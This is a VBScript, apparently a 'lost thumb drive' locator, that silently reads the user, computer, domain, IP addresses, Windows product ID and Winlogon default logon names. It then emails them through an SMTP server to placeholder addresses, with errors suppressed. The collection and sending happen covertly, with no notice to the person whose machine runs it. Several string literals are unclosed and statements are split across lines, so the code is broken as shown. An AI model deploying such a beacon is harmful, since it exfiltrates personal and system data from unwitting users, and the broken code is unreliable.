On Error Resume Next

const HKEY_CURRENT_USER = &H80000001
const HKEY_LOCAL_MACHINE = &H80000002
strComputer = "."

Dim objComputer, objNic, Nic, strNic, lngCount
strIP = ""

Set objComputer = CreateObject("WScript.Network")

strLogon = objComputer.UserName
strComputerName = objComputer.ComputerName
strDomain = objComputer.UserDomain

Set objNic = GetObject("winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")

For Each Nic in objNic
    strNic = Nic.Description
    If Nic.IPEnabled Then
 strIP = strIP & VbTab & Nic.IPAddress(0) & VbCrLf
    End If

Next

Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")

strKeyPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion"

strValue = "RegisteredOwner"
objReg.GetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValue,strOwner

strValue = "ProductName"
objReg.GetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValue,strProductName

strValue = "BuildLab"
objReg.GetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValue,strBuild

strValue = "BuildLab"
objReg.GetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValue,strBuild

strValue = "CSDVersion"
objReg.GetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValue,strCSDVersion

strValue = "ProductID"
objReg.GetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValue,strProductID

strKeyPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

strValue = "DefaultUserName"
objReg.GetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValue,strDefaultUserName

strValue = "DefaultDomainName"
objReg.GetStringValue
HKEY_LOCAL_MACHINE,strKeyPath,strValue,strDefaultDomainName

Const URL = "http://xml.showmyip.com/"
Set objXML = CreateObject("Microsoft.XMLDOM")
objXML.Async=false
objXML.Load(URL)

For Each x in objXML.DocumentElement.ChildNodes
    If x.NodeName = "ip" then
       strPubIP = x.text
    End If
    If x.NodeName = "host" then
       strPubHost = x.text
    End If
Next


strMsgBody = "Computer is registered to: " & strOwner & " and is
logged on as " & strLogon & VbCrLf & "They are using " &
strProductName & " " & strCSDVersion & " Build " & strBuild & VbCrLf &
"Product ID: " & strProductID & VbCrLf & "Computer Name is : " &
strComputerName & VbCrLf & "Default User Name: " & strDefaultUserName
& VbCrLf & "Default Domain Name: " & strDefaultDomainName & " -Actual
Domain Name: " & strDomain & VbCrLf & "IP Address(es):" & VbCrLf &
strIP & VbCrLf & "Public IP: " & strPubIP & vbCrLf & "Public Host
Name: " & strPubHost


Set objEmail = CreateObject("CDO.Message")
objEmail.From = "yourthumbdrive@helpme.com"
objEmail.To = "emailaddress@somewhere.com
objEmail.Subject = "Thumb Drive Location"
objEmail.Textbody = strMsgBody
objEmail.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objEmail.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = _
        "somesmtpserver.com
objEmail.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objEmail.Configuration.Fields.Update
objEmail.Send
